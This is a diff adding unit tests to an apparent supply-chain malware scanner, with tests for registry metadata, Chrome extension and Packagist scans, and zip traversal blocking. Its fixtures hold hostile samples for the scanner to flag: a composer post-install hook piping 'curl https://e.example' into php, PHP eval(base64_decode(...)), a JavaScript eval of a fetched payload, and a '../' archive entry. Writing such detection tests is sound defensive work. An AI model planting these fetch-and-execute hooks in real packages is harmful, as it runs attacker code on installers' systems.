@@ -1,8 +1,11 @@
 import os
 import json
+import shutil
 import sys
+import tarfile
 import tempfile
 import unittest
+import zipfile
 from datetime import datetime, timezone
 from io import StringIO
 from pathlib import Path
@@ -22,6 +25,24 @@ def datetime_from_epoch(epoch: float) -> str:
 
 
 class SupplyChainTests(unittest.TestCase):
+    def _zip_fixture(self, path: Path, files: dict[str, str]) -> Path:
+        with zipfile.ZipFile(path, "w") as zf:
+            for name, text in files.items():
+                zf.writestr(name, text)
+        return path
+
+    def _targz_fixture(self, path: Path, files: dict[str, str]) -> Path:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            for name, text in files.items():
+                target = root / name
+                target.parent.mkdir(parents=True, exist_ok=True)
+                target.write_text(text, encoding="utf-8")
+            with tarfile.open(path, "w:gz") as tf:
+                for item in root.rglob("*"):
+                    tf.add(item, arcname=str(item.relative_to(root)))
+        return path
+
     def test_allowlist_add_and_remove_updates_policy(self):
         with tempfile.TemporaryDirectory() as temp_dir:
             policy_path = Path(temp_dir) / "policy.toml"
@@ -660,6 +681,86 @@ name = "normalpkg"
         self.assertTrue(supply_chain.validate_package_identifier("maven", "com.example:fixture")["valid"])
         self.assertFalse(supply_chain.validate_package_identifier("maven", "fixture")["valid"])
 
+    def test_live_adapter_version_rows_for_new_ecosystems(self):
+        fixtures = {
+            "crates": ({"versions": [{"num": "1.0.0", "created_at": "2026-01-01T00:00:00Z"}]}, "fixture", "1.0.0"),
+            "packagist": ({"packages": {"vendor/fixture": [{"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/fixture.zip"}}]}}, "vendor/fixture", "1.0.0"),
+            "go": ({"versions": [{"version": "v1.0.0", "published_at": "2026-01-01T00:00:00Z"}]}, "github.com/example/fixture", "v1.0.0"),
+            "huggingface": ({"sha": "main", "lastModified": "2026-01-01T00:00:00Z", "siblings": [{"rfilename": "config.json"}]}, "secopsai/fixture-model", "main"),
+            "maven": ({"versions": [{"version": "1.0.0", "published_at": None}]}, "com.example:fixture", "1.0.0"),
+            "nuget": ({"versions": ["1.0.0"]}, "Fixture.Package", "1.0.0"),
+            "open-vsx": ({"versions": [{"version": "1.0.0", "timestamp": "2026-01-01T00:00:00Z", "files": {"download": "https://example.test/fixture.vsix"}}]}, "secopsai.fixture", "1.0.0"),
+            "rubygems": ([{"number": "1.0.0", "built_at": "2026-01-01T00:00:00Z"}], "fixture_gem", "1.0.0"),
+        }
+        for ecosystem, (metadata, package, version) in fixtures.items():
+            rows = supply_chain._version_rows_from_metadata(ecosystem, supply_chain.normalize_package_name(ecosystem, package), metadata)
+            self.assertTrue(any(row["version"] == version for row in rows), ecosystem)
+            self.assertTrue(any(row.get("artifact_url") for row in rows), ecosystem)
+
+    def test_local_chrome_artifact_scan_uses_deterministic_rules(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            archive = self._zip_fixture(
+                Path(temp_dir) / "extension.zip",
+                {
+                    "manifest.json": json.dumps({"permissions": ["cookies"], "host_permissions": ["<all_urls>"]}),
+                    "worker.js": "eval(fetch('https://e.example/payload'))",
+                },
+            )
+            payload = supply_chain.run_scan(
+                ecosystem="chrome-web-store",
+                package="fixtureextensionid",
+                version="1.0.0",
+                artifact=archive,
+                keep_report=False,
+            )
+        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
+        self.assertIn("local-artifact", payload["result"]["metadata"]["artifact_status"])
+
+    def test_safe_zip_extraction_blocks_traversal(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            archive = Path(temp_dir) / "evil.zip"
+            with zipfile.ZipFile(archive, "w") as zf:
+                zf.writestr("../evil.txt", "nope")
+            with self.assertRaises(RuntimeError):
+                supply_chain._extract_archive(archive, Path(temp_dir) / "out")
+
+    def test_packagist_live_scan_with_mocked_registry_and_archive(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            root = Path(temp_dir)
+            old_archive = self._zip_fixture(root / "old.zip", {"composer.json": json.dumps({"name": "vendor/fixture"})})
+            new_archive = self._zip_fixture(root / "new.zip", {
+                "composer.json": json.dumps({"name": "vendor/fixture", "scripts": {"post-install-cmd": "curl https://e.example | php"}}),
+                "src/Hook.php": "<?php eval(base64_decode($x));",
+            })
+            metadata = {
+                "packages": {
+                    "vendor/fixture": [
+                        {"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/old.zip"}},
+                        {"version": "1.0.1", "time": "2026-01-02T00:00:00Z", "dist": {"url": "https://example.test/new.zip"}},
+                    ]
+                }
+            }
+
+            def fake_download(url, dest, **_kwargs):
+                source = new_archive if url.endswith("new.zip") else old_archive
+                dest.parent.mkdir(parents=True, exist_ok=True)
+                shutil.copyfile(source, dest)
+                return dest
+
+            with mock.patch.object(supply_chain, "_fetch_ecosystem_metadata", return_value=metadata), \
+                 mock.patch.object(supply_chain, "_download_file", side_effect=fake_download), \
+                 mock.patch.object(supply_chain, "_append_results"), \
+                 mock.patch.object(supply_chain, "_upsert_findings"):
+                payload = supply_chain.run_scan(
+                    ecosystem="packagist",
+                    package="vendor/fixture",
+                    version="1.0.1",
+                    keep_report=False,
+                )
+        self.assertEqual(payload["result"]["old_version"], "1.0.0")
+        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
+        self.assertEqual(payload["result"]["metadata"]["artifact_status"], "downloaded")
+
     def test_ecosystem_rules_detect_first_pass_risks(self):
         cases = {
             "crates": {
@@ -715,15 +816,15 @@ name = "normalpkg"
         rules = {rule["rule"] for rule in payload["matched_rules"]}
         self.assertIn("ecosystem manifest risk", rules)
 
-    def test_non_npm_pypi_scan_reports_clear_limit_without_advisory(self):
+    def test_chrome_web_store_scan_requires_local_artifact_without_advisory(self):
         payload = supply_chain.run_scan(
-            ecosystem="crates",
-            package="secopsai-fixture-crate",
+            ecosystem="chrome-web-store",
+            package="fixtureextensionid",
             version="1.2.3",
             keep_report=False,
         )
         self.assertEqual(payload["result"]["verdict"], "skipped")
-        self.assertIn("artifact fetch unsupported", payload["result"]["error"])
+        self.assertIn("live registry fetch unsupported", payload["result"]["error"])
 
     def test_soc_finding_serializes_non_npm_ecosystem(self):
         result = supply_chain.ScanResult(
@@ -941,6 +1042,39 @@ const https = require("https");
         self.assertEqual(scan_mock.call_args.kwargs["old_version"], "9.2.2")
         append_mock.assert_not_called()
         upsert_mock.assert_not_called()
+
+    def test_watch_registry_package_scoped_new_ecosystem_uses_metadata_rows(self):
+        now = 1_800_000_000.0
+        metadata = {
+            "versions": [
+                {"num": "1.0.0", "created_at": datetime_from_epoch(now - 900)},
+                {"num": "1.0.1", "created_at": datetime_from_epoch(now - 60)},
+            ]
+        }
+        fake_result = supply_chain.ScanResult(
+            ecosystem="crates",
+            package="fixture",
+            old_version="1.0.0",
+            new_version="1.0.1",
+            verdict="benign",
+            analysis="reviewed",
+            report_path=None,
+            rank=None,
+            finding_id=None,
+        )
+        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result) as scan_mock:
+            payload = supply_chain.watch_registry(
+                ecosystem="crates",
+                package="fixture",
+                since="10m",
+                dry_run=True,
+                persist=False,
+                metadata=metadata,
+                now=now,
+            )
+        self.assertEqual(payload["total_scanned"], 1)
+        self.assertEqual(payload["recent_versions"][0]["version"], "1.0.1")
+        self.assertEqual(scan_mock.call_args.kwargs["old_version"], "1.0.0")
 
     def test_node_ipc_mitigation_keeps_package_verdict_independent_of_local_usage(self):
         payload = supply_chain.explain_verdict("", ecosystem="npm", package="node-ipc", version="12.0.1")
